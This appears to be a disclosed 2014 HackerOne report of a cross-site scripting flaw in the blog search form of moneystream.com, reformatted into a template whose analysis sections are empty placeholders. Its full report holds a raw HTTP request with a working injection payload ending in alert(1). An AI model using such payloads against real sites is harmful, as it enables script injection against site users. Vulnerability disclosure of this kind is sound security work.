# Here is another XSS i got for you

## Metadata
- **Source:** HackerOne
- **Report:** 4276 | https://hackerone.com/reports/4276
- **Submitted:** 2014-03-18
- **Reporter:** shahmeer-amir
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
I ve verified it and it does trigger a JS alert
POST /blog/ HTTP/1.1
Host: moneystream.com
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: https://moneystream.com/blog/
Cookie: TrackingId=d86722a7-b3fc-45a4-87c8-fac0a31cca27
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

I ve verified it and it does trigger a JS alert
POST /blog/ HTTP/1.1
Host: moneystream.com
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: https://moneystream.com/blog/
Cookie: TrackingId=d86722a7-b3fc-45a4-87c8-fac0a31cca27
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

s=Search%2bthis%2bwebsite%252671879%3balert(1)%2f%2f593

</details>

---
*Analysed by Claude on 2026-05-24*
